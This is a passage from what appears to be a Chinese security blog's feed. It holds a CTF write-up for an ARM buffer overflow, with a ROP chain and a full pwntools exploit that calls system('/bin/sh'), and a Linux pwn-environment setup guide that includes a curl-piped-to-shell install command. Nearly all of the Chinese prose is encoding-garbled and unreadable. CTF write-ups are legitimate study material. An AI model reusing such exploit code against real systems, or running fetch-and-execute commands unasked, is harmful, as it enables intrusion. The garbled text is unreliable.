foundË°®Á§∫ÂºÄÂêØ„ÄÇÈáë‰∏ùÈõÄÊúÄÊó©ÊåáÁöÑÊòØÁüøÂ∑•ÊõæÂà©Áî®Èáë‰∏ùÈõÄÊù•Á°ÆËÆ§ÊòØÂê¶ÊúâÊ∞î‰ΩìÊ≥ÑÊºèÔºåÂ¶ÇÊûúÈáë‰∏ùÈõÄÂõ†‰∏∫Ê∞î‰ΩìÊ≥ÑÊºèËÄå‰∏≠ÊØíÊ≠ª‰∫°ÔºåÂèØ‰ª•ÁªôÁüøÂ∑•È¢ÑË≠¶„ÄÇËøôÈáåÊòØ‰∏ÄÁßçÁºìÂÜ≤Âå∫Ê∫¢Âá∫ÊîªÂáªÁºìËß£ÊâãÊÆµÔºöÂêØÁî®Ê†à‰øùÊä§ÂêéÔºåÂáΩÊï∞ÂºÄÂßãÊâßË°åÁöÑÊó∂ÂÄô‰ºöÂÖàÂæÄÊ†àÈáåÊèíÂÖ•cookie‰ø°ÊÅØÔºåÂΩìÂáΩÊï∞ÁúüÊ≠£ËøîÂõûÁöÑÊó∂ÂÄô‰ºöÈ™åËØÅcookie‰ø°ÊÅØÊòØÂê¶ÂêàÊ≥ïÔºåÂ¶ÇÊûú‰∏çÂêàÊ≥ïÂ∞±ÂÅúÊ≠¢Á®ãÂ∫èËøêË°å„ÄÇÊîªÂáªËÄÖÂú®Ë¶ÜÁõñËøîÂõûÂú∞ÂùÄÁöÑÊó∂ÂÄôÂæÄÂæÄ‰πü‰ºöÂ∞Ücookie‰ø°ÊÅØÁªôË¶ÜÁõñÊéâÔºåÂØºËá¥Ê†à‰øùÊä§Ê£ÄÊü•Â§±Ë¥•ËÄåÈòªÊ≠¢shellcodeÁöÑÊâßË°å„ÄÇÂú®LinuxÂ∞Ücookie‰ø°ÊÅØÁß∞‰∏∫Canary„ÄÇ</p><p> <strong> NX </strong> : No ExecuteÔºåÊ†à‰∏çÂèØÊâßË°åÔºå‰πüÂ∞±ÊòØwindows‰∏äÁöÑDEP„ÄÇ ÂàÜÊûêÁºìÂÜ≤Âå∫Ê∫¢Âá∫ÊîªÂáªÔºåÂÖ∂Ê†πÊ∫êÂú®‰∫éÁé∞‰ª£ËÆ°ÁÆóÊú∫ÂØπÊï∞ÊçÆÂíå‰ª£Á†ÅÊ≤°ÊúâÊòéÁ°ÆÂå∫ÂàÜËøô‰∏ÄÂÖàÂ§©Áº∫Èô∑ÔºåÂ∞±ÁõÆÂâçÊù•ÁúãÈáçÊñ∞ÂéªËÆæËÆ°ËÆ°ÁÆóÊú∫‰ΩìÁ≥ªÁªìÊûÑÂü∫Êú¨‰∏äÊòØ‰∏çÂèØËÉΩÁöÑÔºåÊàë‰ª¨Âè™ËÉΩÈù†ÂêëÂâçÂÖºÂÆπÁöÑ‰øÆË°•Êù•ÂáèÂ∞ëÊ∫¢Âá∫Â∏¶Êù•ÁöÑÊçüÂÆ≥ÔºåDEPÂ∞±ÊòØÁî®Êù•Âº•Ë°•ËÆ°ÁÆóÊú∫ÂØπÊï∞ÊçÆÂíå‰ª£Á†ÅÊ∑∑Ê∑ÜËøô‰∏ÄÂ§©ÁÑ∂Áº∫Èô∑ÁöÑ„ÄÇ </p><p> <strong>PIE</strong>: position-independent executables, ‰ΩçÁΩÆÊó†ÂÖ≥ÁöÑÂèØÊâßË°åÊñá‰ª∂Ôºå‰πüÂ∞±ÊòØÂ∏∏ËØ¥ÁöÑASLR(Address space layout randomization) Âú∞ÂùÄÈöèÊú∫ÂåñÔºåÁ®ãÂ∫èÊØèÊ¨°ÂêØÂä®Âü∫ÂùÄÈÉΩÈöèÊú∫„ÄÇ </p></blockquote></blockquote><h3 id="‰∫å-ÂàÜÊûêÁ®ãÂ∫è"><a href="#‰∫å-ÂàÜÊûêÁ®ãÂ∫è" class="headerlink" title="‰∫å. ÂàÜÊûêÁ®ãÂ∫è"></a>‰∫å. ÂàÜÊûêÁ®ãÂ∫è</h3><blockquote><p>ÂºÄÂßãËøúÁ®ãË∞ÉËØïÔºö</p><p><img src="https://i.loli.net/2018/10/15/5bc4403f1bdbb.png" alt=""></p><p>Âè¶‰∏ÄËæπ‰ΩøÁî® <code>gdb-multiarch typo -q</code>ËøõÂÖ•pwndbgÔºåÂπ∂‰∏î‰ΩøÁî®<code>target remote localhost:6788</code>ËøûÊé•Á®ãÂ∫èÔºö</p><p><img src="https://i.loli.net/2018/10/15/5bc4437a3ebb6.png" alt=""></p><p>ÁîüÊàêpaddingÔºåËæìÂÖ•ÂêéÂæóÂà∞Ê∫¢Âá∫‰ø°ÊÅØ</p><pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> cyclic 200aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</code></pre><p><img src="https://i.loli.net/2018/10/15/5bc4443368612.png" alt=""></p></blockquote><h3 id="‰∏â-Á°ÆÂÆöÊ∫¢Âá∫ÁÇπ"><a href="#‰∏â-Á°ÆÂÆöÊ∫¢Âá∫ÁÇπ" class="headerlink" title="‰∏â.Á°ÆÂÆöÊ∫¢Âá∫ÁÇπ"></a>‰∏â.Á°ÆÂÆöÊ∫¢Âá∫ÁÇπ</h3><blockquote><p>‰πãÂâçÂ∑≤ÁªèËØ¥ËøáPCÁõ∏ÂΩì‰∫éEIP,RIP‰πãÁ±ªÁöÑÊåáÂêë‰∏ã‰∏ÄÊù°Êåá‰ª§ÁöÑÂØÑÂ≠òÂô®ÔºåÈÇ£‰πàÂèØ‰ª•ËÆ°ÁÆópaddingÂà∞PCÂØÑÂ≠òÂô®ÁöÑÂÅèÁßªÈáèËøõËÄåÁ°ÆÂÆöÊ∫¢Âá∫ÁÇπ‰∏∫0x62616165Ôºö</p><p>‰ΩøÁî®pwndbgÁöÑ<code>cyclic -l</code>ÂëΩ‰ª§ÂèØ‰ª•ÈÄöËøáÂú∞ÂùÄÔºåÂ≠óÁ¨¶‰∏≤Á°ÆÂÆöÂÅèÁßªÈáè.</p><p><img src="https://i.loli.net/2018/10/15/5bc445613c9bc.png" alt=""></p></blockquote><h3 id="Âõõ-ÊûÑÈÄ†payloadËøõË°åÂà©Áî®"><a href="#Âõõ-ÊûÑÈÄ†payloadËøõË°åÂà©Áî®" class="headerlink" title="Âõõ.ÊûÑÈÄ†payloadËøõË°åÂà©Áî®"></a>Âõõ.ÊûÑÈÄ†payloadËøõË°åÂà©Áî®</h3><blockquote><p> ÈªòÈªòÊ†áËÆ∞M4xÂçöÊñá‰∏≠ÁöÑËøôÂè•ËØù<code>Âõ†‰∏∫ÊòØÈùôÊÄÅÈìæÊé•, ÊâÄ‰ª• binary ‰∏≠‰∏ÄÂÆö‰ºöÊúâ system ÂáΩÊï∞ Âíå /bin/sh Â≠óÁ¨¶‰∏≤, Â¶ÇÊûúËÉΩÊâæÂà∞Ê∫¢Âá∫ÁÇπ, ÂæàÂÆπÊòìÂ∞±ËÉΩÁî® rop Êù•Ëß£ÂÜ≥‰∫Ü</code>ÔºåÂ≠¶‰π†‰∏ÄÊ≥¢ÂßøÂäøÔºåÊûÑÈÄ†<code>rop chain</code>ÔºåÈÄöËøáROPgadgetÂèØ‰ª•ÊâæÂà∞Êàë‰ª¨ÈúÄË¶ÅÁöÑÔºöÂèØ‰ª•Áî®Êù•‰º†ÈÄí ËøîÂõûÂÄºÁöÑÂØÑÂ≠òÂô® r0</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/15/5bc4465b7fefb.png" class="lazyload"></p><p>ÈÇ£‰πàÊé•‰∏ãÊù•Â∞±ÊòØÂØªÊâæsystemÂáΩÊï∞ÁöÑÂú∞ÂùÄÔºåÂ∞ÜÂÖ∂Â°´ÂÖ•PCÂØÑÂ≠òÂô®ÁöÑ‰ΩçÁΩÆÔºå‰ªéËÄåÊâßË°å<code>system(&#39;/bin/sh&#39;)</code></p><p>IDAË∞ÉËØï‰∏ÄÊ≥¢Ôºö</p><p>ÈÄöËøáÂ≠óÁ¨¶‰∏≤Êü•ÊâæÊàñËÄÖ‰∫§ÂèâÂºïÁî®ÂèØ‰ª•ÂèëÁé∞ÂáΩÊï∞<code>sub_10BA8</code></p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/15/5bc44948ebb68.png" class="lazyload"></p><p>‰∏çÁü•ÈÅìÊòØ‰∏çÊòØida7.0ÁöÑÂéüÂõ†ÔºåËøôÈáåÁõ¥Êé•ÊâæÂà∞‰∫ÜsystemÂáΩÊï∞Ôºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/15/5bc44a0873387.png" class="lazyload"></p><p>ÂèØ‰ª•ÁúãÂà∞ÂÖ∂ÊâßË°åÂëΩ‰ª§ÁöÑÈÄªËæëÂíåÂú∞ÂùÄÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/15/5bc44d1ac5d50.png" class="lazyload"></p><p>Êé•‰∏ãÊù•ÂèØ‰ª•ÂºÄÂßãÊûÑÈÄ†payloadÁªìÊûÑÔºö</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">|</span>    padding            <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> 112*<span class="token string">'a'</span><span class="token operator">|</span>    pop <span class="token punctuation">{</span>r0,r4,pc<span class="token punctuation">}</span>    <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> p32<span class="token punctuation">(</span>0x20904<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#gadget_addr</span><span class="token operator">|</span>    /bin/sh            <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> p32<span class="token punctuation">(</span>0x6c384<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#/bin/sh_addr</span><span class="token operator">|</span>    junk_data<span class="token punctuation">(</span>r4<span class="token punctuation">)</span>    <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> p32<span class="token punctuation">(</span><span class="token string">"anything"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#r4Â°´ÂÖÖ</span><span class="token operator">|</span>    system_addr<span class="token punctuation">(</span>pc<span class="token punctuation">)</span>    <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> p32<span class="token punctuation">(</span>0x110b4<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#systemÂáΩÊï∞Âú∞ÂùÄ</span></code></pre><p><strong>Ê∫¢Âá∫ÂØºËá¥PCÊåáÂêëgadget_addrÔºåÁÑ∂ÂêéÊâßË°åÂëΩ‰ª§popÂá∫Ê†àÂ∞Ü‚Äù/bin/sh‚ÄùËµãÂÄºÂà∞r0ÂØÑÂ≠òÂô®Ôºåjunk_dataËµãÂÄºÂà∞r4ÂØÑÂ≠òÂô®Ôºåsystem_addrËµãÂÄºÂà∞PCÂØÑÂ≠òÂô®„ÄÇ</strong></p></blockquote><h3 id="‰∫î-ÊîªÁ†¥"><a href="#‰∫î-ÊîªÁ†¥" class="headerlink" title="‰∫î.ÊîªÁ†¥"></a>‰∫î.ÊîªÁ†¥</h3><blockquote><p>ÂÜôÂá∫exp:    </p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>__Auther__ <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./typo"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"quit\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x20904</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x6c384</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x110b4</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"echo xiaoyifeng"</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Error!"</span><span class="token punctuation">)</span>    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"xiaoyifeng"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"getshell"</span><span class="token punctuation">)</span></code></pre><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/15/5bc4518d2ce65.png" class="lazyload"></p></blockquote><blockquote><p>PWNÁúüÂ•ΩÁé©ÔºÅüò≠üò≠</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> ‰∫åËøõÂà∂ÂÆâÂÖ® </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>LinuxÁéØÂ¢ÉÈÖçÁΩÆ</title>
      <link href="/2018/10/14/Linux%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
      <url>/2018/10/14/Linux%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>ËÆ∞ÂΩïLinuxÁéØÂ¢ÉÈÖçÁΩÆ„ÄÇ</p><a id="more"></a><h1 id="LinuxÁéØÂ¢ÉÈÖçÁΩÆ"><a href="#LinuxÁéØÂ¢ÉÈÖçÁΩÆ" class="headerlink" title="LinuxÁéØÂ¢ÉÈÖçÁΩÆ"></a>LinuxÁéØÂ¢ÉÈÖçÁΩÆ</h1><blockquote><p>‚Äã    ‰Ωú‰∏∫‰∏Ä‰∏™‰ø°ÂÆâÂ≠¶‰π†ËÄÖÔºåÂíåÁéØÂ¢ÉÊâì‰∫§ÈÅìÊòØÁªèÂ∏∏ÁöÑ‰∫ãÔºåÈÇ£‰πàÊé•‰∏ãÊù•‰∏∫‰∫åËøõÂà∂Â≠¶‰π†ÂºÄÂßãÂÅöÂáÜÂ§áÔºåÈÖçÁΩÆÂêÑÁßçÊû∂ÊûÑÁöÑË∞ÉËØïÁéØÂ¢ÉÔºåÊèêÈ´òÊïàÁéá„ÄÇ</p></blockquote><h2 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh-my-zsh"></a>oh-my-zsh</h2><blockquote><p>‚Äã    zshÊòØ‰∏Ä‰∏™ÂæàÂº∫Â§ßÁöÑlinuxÁªàÁ´ØshellÂ∑•ÂÖ∑ÔºåËÄåoh-my-zshÊòØ‰∏Ä‰∏™È´òÊïàÁéáÁöÑÈÖçÁΩÆÂ∑•ÂÖ∑ÔºåÈÄöËøáoh-my-zshÂèØ‰ª•ÂæàÂø´Âú∞ÈÖçÁΩÆzshÔºåÈÇ£‰πàÂ¶Ç‰ΩïËøõË°åÂÆåÊï¥Âú∞ÂÆâË£ÖÂë¢Ôºö</p><blockquote><p>È¶ñÂÖàÈúÄË¶ÅÂÆâË£ÖpythonÁöÑpipÔºåÁÑ∂ÂêéÂÆâË£ÖzshÔºåÂÜçÈÄöËøá<code>sh -c&quot;$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;</code>ÂëΩ‰ª§Êù•ÂÆâË£Öoh-my-zsh„ÄÇ</p><p>ÈÄöËøá‰øÆÊîπ<code>~/.zshrc</code>ÈáåÁöÑÂèÇÊï∞ÔºåÂ¶Ç‰∏ªÈ¢ò<code>ZSH_THEME=&quot;random&quot;</code>Êù•ËÆæÁΩÆÁªàÁ´ØÁöÑÊ†∑Âºè„ÄÇ</p><p>ÈÖçÁΩÆzshËØ≠Ê≥ïÈ´ò‰∫ÆÔºå<code>git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting</code>ÈÄöËøáÊ≠§ÂëΩ‰ª§‰∏ãËΩΩÊèí‰ª∂ÔºåÂπ∂Êåâ‰∏ãÂõæÊ∑ªÂä†ÂèÇÊï∞<code>zsh-syntax-highlighting</code>„ÄÇ</p><p><img src="https://i.loli.net/2018/10/14/5bc346022c416.png" alt=""></p><p>‰ª£Á†ÅËá™Âä®Ë°•Êèí‰ª∂‰∏ãËΩΩ <code>git clone https://github.com/zsh-users/zsh-autosuggestions</code> Âπ∂ÊîæÂú®<code>~/.oh-my-zsh/custom/plugins</code>ÁõÆÂΩï‰∏ãÈù¢ÔºåÁÑ∂ÂêéÂÉè‰∏äÈù¢‰∏ÄÊ†∑Ê∑ªÂä†ÂèÇÊï∞Âç≥ÂèØ</p></blockquote></blockquote><h2 id="pwnÁéØÂ¢ÉÈÖçÁΩÆ"><a href="#pwnÁéØÂ¢ÉÈÖçÁΩÆ" class="headerlink" title="pwnÁéØÂ¢ÉÈÖçÁΩÆ"></a>pwnÁéØÂ¢ÉÈÖçÁΩÆ</h2><blockquote><p>ÂèÇÁÖßm4xÂ§ß‰Ω¨ÁöÑÂçöÂÆ¢<a href="https://m4x.fun/post/how-2-pwn-an-arm-binary/" target="_blank" rel="noopener">https://m4x.fun/post/how-2-pwn-an-arm-binary/</a></p><ul><li>ÂÆâË£Ö gitÔºågdb Âíå gdb-multiarchÔºåÂêåÊó∂ÂÆâË£Ö binfmt*Áî®Êù•ËØÜÂà´Êñá‰ª∂Á±ªÂûã</li></ul><pre class=" language-bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">apt-get</span> update$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token function">git</span> gdb gdb-multiarch$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token string">"binfmt*"</span></code></pre><ul><li>ÂÆâË£Ö gdb ÁöÑÊèí‰ª∂ pwndbgÔºàÊàñËÄÖ gef Á≠âÊîØÊåÅÂ§öÊû∂ÊûÑÁöÑÊèí‰ª∂ÔºâÔºåÈúÄË¶ÅpipÔºåpip3Á≠âÊ®°Âùó</li></ul><pre><code>$ git clone https://github.com/pwndbg/pwndbg$ cd pwndbg</code></pre><ul><li>Âõ†‰∏∫ÊàëÁî®ÁöÑÊòØdeepinÂÆâË£ÖÁöÑpwndbgÔºàËøôÊòØ‰∏™ÂùëÁÇπÔºâÔºåÊâÄ‰ª•ÈúÄË¶ÅÂØπsetup.shÁ®ç‰Ωú‰øÆÊîπÔºåÂ¶Ç‰∏ãÔºö</li></ul><pre class=" language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">set</span> -ex<span class="token comment" spellcheck="true"># Helper functions</span>linux<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">uname</span> <span class="token operator">|</span> <span class="token function">grep</span> -i Linux <span class="token operator">&amp;</span><span class="token operator">></span>/dev/null<span class="token punctuation">}</span>osx<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">uname</span> <span class="token operator">|</span> <span class="token function">grep</span> -i Darwin <span class="token operator">&amp;</span><span class="token operator">></span>/dev/null<span class="token punctuation">}</span>PYTHON<span class="token operator">=</span><span class="token string">''</span>INSTALLFLAGS<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">if</span> osx <span class="token operator">||</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token operator">==</span> <span class="token string">"--user"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    INSTALLFLAGS<span class="token operator">=</span><span class="token string">"--user"</span><span class="token keyword">else</span>    PYTHON<span class="token operator">=</span><span class="token string">"sudo "</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token operator">!</span> <span class="token function">hash</span> gdb<span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> <span class="token string">'Could not find gdb in <span class="token variable">$PATH</span>'</span>    <span class="token keyword">exit</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true"># Update all submodules</span><span class="token comment" spellcheck="true">#git submodule update --init --recursive</span><span class="token comment" spellcheck="true"># Find the Python version used by GDB.</span>PYVER<span class="token operator">=</span><span class="token punctuation">$(</span>gdb -batch -q --nx -ex <span class="token string">'pi import platform; print(".".join(platform.python_version_tuple()[:2]))'</span><span class="token punctuation">)</span>PYTHON+<span class="token operator">=</span><span class="token punctuation">$(</span>gdb -batch -q --nx -ex <span class="token string">'pi import sys; print(sys.executable)'</span><span class="token punctuation">)</span>PYTHON+<span class="token operator">=</span><span class="token string">"<span class="token variable">${PYVER}</span>"</span><span class="token comment" spellcheck="true"># Find the Python site-packages that we need to use so that</span><span class="token comment" spellcheck="true"># GDB can find the files once we've installed them.</span><span class="token keyword">if</span> linux <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> -z <span class="token string">"<span class="token variable">$INSTALLFLAGS</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    SITE_PACKAGES<span class="token operator">=</span><span class="token punctuation">$(</span>gdb -batch -q --nx -ex <span class="token string">'pi import site; print(site.getsitepackages()[0])'</span><span class="token punctuation">)</span>    INSTALLFLAGS<span class="token operator">=</span><span class="token string">"--target <span class="token variable">${SITE_PACKAGES}</span>"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true"># Make sure that pip is available</span><span class="token keyword">if</span> <span class="token operator">!</span> <span class="token variable">${PYTHON}</span> -m pip -V<span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token variable">${PYTHON}</span> -m ensurepip <span class="token variable">${INSTALLFLAGS}</span> --upgrade<span class="token keyword">fi</span><span class="token comment" spellcheck="true"># Upgrade pip itself</span><span class="token variable">${PYTHON}</span> -m pip <span class="token function">install</span> <span class="token variable">${INSTALLFLAGS}</span> --upgrade pip<span class="token comment" spellcheck="true"># Install Python dependencies</span><span class="token variable">${PYTHON}</span> -m pip <span class="token function">install</span> <span class="token variable">${INSTALLFLAGS}</span> -Ur requirements.txt<span class="token comment" spellcheck="true"># Load Pwndbg into GDB on every launch.</span><span class="token keyword">if</span> <span class="token operator">!</span> <span class="token function">grep</span> pwndbg ~/.gdbinit <span class="token operator">&amp;</span><span class="token operator">></span>/dev/null<span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> <span class="token string">"source <span class="token variable">$PWD</span>/gdbinit.py"</span> <span class="token operator">>></span> ~/.gdbinit<span class="token keyword">fi</span></code></pre><pre class=" language-bash"><code class="language-bash">$ ./setup.sh</code></pre><ul><li>ÂÆâË£ÖqemuÊ®°ÊãüÁéØÂ¢É</li></ul><pre class=" language-bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu-user</code></pre></blockquote><blockquote><p>ÈÄöËøá qemu Ê®°Êãü arm/mips ÁéØÂ¢ÉÔºåËøõËÄåËøõË°åË∞ÉËØï Ôºå</p><p><img src="https://i.loli.net/2018/10/14/5bc34c058efc2.png" alt=""></p><p>ËøêË°åÂä®ÊÄÅÁöÑbinary ÈúÄË¶ÅÊàë‰ª¨Êü•ËØ¢ÂØπÂ∫îÊû∂ÊûÑÁöÑÂÖ±‰∫´Â∫ìÔºö</p><p><code>apt-cache search &quot;libc6&quot; | grep ARCH</code> </p><p>Âä®ÊÄÅÈìæÊé•ÁöÑ bianry ÈúÄË¶ÅÁî®ÂØπÂ∫îÁöÑ qemu ÂêåÊó∂ÊåáÂÆöÂÖ±‰∫´Â∫ìË∑ØÂæÑÔºå‰æãÂ¶ÇÔºö</p><p><code>qemu-mipsel -L /usr/mipselbalalbala/  ./add</code></p><blockquote><p>mipsÔºàÂ§ßÁ´ØÔºâÂíåmipselÔºàÂ∞èÁ´ØÔºâÊúâ‰ªÄ‰πàÂå∫Âà´Âë¢ÔºåÂú®‰∫éÂ≠òÂÇ®ÊñπÂºèÔºå‰∏Ä‰∏™ÊòØÂ§ßÁ´ØÔºà‰ΩéÂ∫èÂ≠òÂú®È´òÂú∞ÂùÄÔºåÊåâÈ°∫Â∫èÊù•ÔºâÔºå‰∏Ä‰∏™ÊòØÂ∞èÁ´ØÂ∫èÔºàÂ∞Ü‰ΩéÂ∫èÁöÑÂ≠òÂú®‰ΩéÂú∞ÂùÄÔºåÂèçÂ∏∏ËØÜÊù•Ôºâ„ÄÇÂΩ¢Ë±°Âú∞ËØ¥ÔºöÂ§ßÁ´ØÊòØ‰ªé‰∏äÂæÄ‰∏ãÊéâÔºåÂ∞èÁ´ØÊòØ‰ªé‰∏ãÂæÄ‰∏äÈ£û„ÄÇ</p></blockquote><p>Êàë‰ª¨Âè™ÈúÄÂÆâË£ÖÁ±ª‰ºº <strong>libc6-ARCH-cross</strong> ÂΩ¢ÂºèÁöÑÂç≥ÂèØ ,ÈùôÊÄÅÈìæÊé•ÁöÑ binary Áõ¥Êé•ËøêË°åÂç≥ÂèØÔºå‰ºöËá™Âä®Ë∞ÉÁî®ÂØπÂ∫îÊû∂ÊûÑÁöÑ qemuÔºõ</p><p>Ë∞ÉËØïÂèØ‰ª•‰ΩøÁî® qemu ÁöÑ -g ÊåáÂÆöÁ´ØÂè£</p><pre class=" language-bash"><code class="language-bash">$ qemu-mipsel -g 1234 -L /usr/mipsel-linux-gnu/ ./add</code></pre><p><img src="https://i.loli.net/2018/10/14/5bc359ad27655.png" alt=""></p><p>ÁÑ∂Âêé‰ΩøÁî®<code>gdb-multiarch</code>ËøõË°åË∞ÉËØïÔºåÂÖàÊåáÂÆöÊû∂ÊûÑÔºåÁÑ∂Âêé‰ΩøÁî®remoteÂäüËÉΩ </p><pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> <span class="token keyword">set</span> architecture mips <span class="token punctuation">(</span>‰ΩÜÂ§ßÂ§öÊï∞ÊÉÖÂÜµ‰∏ãËøô‰∏ÄÊ≠•ÂèØ‰ª•ÁúÅÁï•, ‰ºº‰πé pwndbg ËÉΩËá™Âä®ËØÜÂà´Êû∂ÊûÑ<span class="token punctuation">)</span>pwndbg<span class="token operator">></span> target remote localhost:1234<span class="token comment" spellcheck="true">#pedaÂ∫îËØ•ÈóÆÈ¢ò‰∏çÂ§ß</span></code></pre></blockquote><blockquote><p>‰∏ãËΩΩÂÖ±‰∫´Â∫ìÂ≠òÂú®<code>/usr/</code>ÁõÆÂΩïÔºö</p><p><img src="https://i.loli.net/2018/10/14/5bc3583d78da3.png" alt=""></p></blockquote><h2 id="ÂºÄÂßã‰ΩøÁî®pwndbgË∞ÉËØï"><a href="#ÂºÄÂßã‰ΩøÁî®pwndbgË∞ÉËØï" class="headerlink" title="ÂºÄÂßã‰ΩøÁî®pwndbgË∞ÉËØï"></a>ÂºÄÂßã‰ΩøÁî®pwndbgË∞ÉËØï</h2><blockquote><p> pwndbgÊ≠£Â∏∏ÂêØÂä®ÔºàÂºÄÂøÉüòÑÔºâÔºö<img src="https://i.loli.net/2018/10/14/5bc363e61dd11.png" alt=""></p><p>ËÆæÁΩÆÂ•ΩÂä®ÊÄÅË∞ÉËØïÁ´ØÂè£ÔºåÈÄâÊã©Â•ΩÂÖ±‰∫´Â∫ìÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/14/5bc364862d2ce.png" class="lazyload"></p><p>ÁÑ∂ÂêéÁî®<code>gdb-multiarch</code> -qÂêØÂä® pwndbgÔºåËÆæÁΩÆÂ•ΩÊñá‰ª∂Êû∂ÊûÑÔºåËøûÊé•Á´ØÂè£ÔºåÂºÄÂßãÂä®ÊÄÅË∞ÉËØïÔºö<br><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/14/5bc364ebc9a23.png" class="lazyload"></p></blockquote><blockquote><p>‚Äã    ÂØπ‰∫éÈùôÊÄÅÁºñËØëÁöÑ bianryÔºå ÂèØ‰ª•‰ΩøÁî® lscan, flirt, rizzo, bindiff Á≠âÂ§öÁßçÊñπÊ≥ïÊÅ¢Â§çÈÉ®ÂàÜÁ¨¶Âè∑Ë°®</p><p>Âä†Ê≤πÂ≠¶‰π†ÂêßÔºÅ</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ÁéØÂ¢ÉÈÖçÁΩÆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> PwnÁéØÂ¢ÉÈÖçÁΩÆ </tag>
            
            <tag> qemu </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2017APTÊä•ÂëäÁ†îËØª</title>
